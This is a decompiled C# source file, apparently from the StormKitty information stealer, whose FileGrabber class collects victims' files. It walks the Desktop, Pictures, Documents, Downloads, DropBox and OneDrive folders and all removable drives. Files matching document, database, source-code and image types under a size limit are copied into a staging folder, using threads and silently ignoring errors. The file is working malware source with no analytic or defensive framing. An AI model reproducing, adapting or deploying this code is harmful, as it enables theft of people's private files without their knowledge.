﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using StormKitty;

namespace Stealer
{
	// Token: 0x02000021 RID: 33
	internal sealed class FileGrabber
	{
		// Token: 0x0600009C RID: 156 RVA: 0x000055E0 File Offset: 0x000037E0
		private static string RecordFileType(string type)
		{
			if (!(type == "Document"))
			{
				if (!(type == "DataBase"))
				{
					if (!(type == "SourceCode"))
					{
						if (type == "Image")
						{
							Counter.GrabberImages++;
						}
					}
					else
					{
						Counter.GrabberSourceCodes++;
					}
				}
				else
				{
					Counter.GrabberDatabases++;
				}
			}
			else
			{
				Counter.GrabberDocuments++;
			}
			return type;
		}

		// Token: 0x0600009D RID: 157 RVA: 0x0000565C File Offset: 0x0000385C
		private static string DetectFileType(string ExtensionName)
		{
			string text = ExtensionName.Replace(".", "").ToLower();
			foreach (KeyValuePair<string, string[]> keyValuePair in Config.GrabberFileTypes)
			{
				foreach (string value2 in keyValuePair.Value)
				{
					if (text.Equals(value2))
					{
						return FileGrabber.RecordFileType(keyValuePair.Key);
					}
				}
			}
			return null;
		}

		// Token: 0x0600009E RID: 158 RVA: 0x000056FC File Offset: 0x000038FC
		private static void GrabFile(string path)
		{
			FileInfo fileInfo = new FileInfo(path);
			if (fileInfo.Length > (long)Config.GrabberSizeLimit)
			{
				return;
			}
			if (FileGrabber.DetectFileType(fileInfo.Extension) == null)
			{
				return;
			}
			string text = Path.Combine(FileGrabber.SavePath, Path.GetDirectoryName(path).Replace(Path.GetPathRoot(path), "DRIVE-" + Path.GetPathRoot(path).Replace(":", "")));
			string destFileName = Path.Combine(text, fileInfo.Name);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			fileInfo.CopyTo(destFileName, true);
		}

		// Token: 0x0600009F RID: 159 RVA: 0x00005790 File Offset: 0x00003990
		private static void GrabDirectory(string path)
		{
			if (!Directory.Exists(path))
			{
				return;
			}
			string[] directories;
			string[] files;
			try
			{
				directories = Directory.GetDirectories(path);
				files = Directory.GetFiles(path);
			}
			catch (UnauthorizedAccessException)
			{
				return;
			}
			catch (AccessViolationException)
			{
				return;
			}
			string[] array = files;
			for (int i = 0; i < array.Length; i++)
			{
				FileGrabber.GrabFile(array[i]);
			}
			foreach (string path2 in directories)
			{
				try
				{
					FileGrabber.GrabDirectory(path2);
				}
				catch
				{
				}
			}
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x00005820 File Offset: 0x00003A20
		public static void Run(string sSavePath)
		{
			try
			{
				FileGrabber.SavePath = sSavePath;
				foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
				{
					if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
					{
						FileGrabber.TargetDirs.Add(driveInfo.RootDirectory.FullName);
					}
				}
				if (!Directory.Exists(FileGrabber.SavePath))
				{
					Directory.CreateDirectory(FileGrabber.SavePath);
				}
				List<Thread> list = new List<Thread>();
				using (List<string>.Enumerator enumerator = FileGrabber.TargetDirs.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						string dir = enumerator.Current;
						try
						{
							list.Add(new Thread(delegate()
							{
								FileGrabber.GrabDirectory(dir);
							}));
						}
						catch
						{
						}
					}
				}
				foreach (Thread thread in list)
				{
					thread.Start();
				}
				foreach (Thread thread2 in list)
				{
					if (thread2.IsAlive)
					{
						thread2.Join();
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		// Token: 0x04000072 RID: 114
		private static string SavePath = "Grabber";

		// Token: 0x04000073 RID: 115
		private static List<string> TargetDirs = new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive")
		};
	}
}
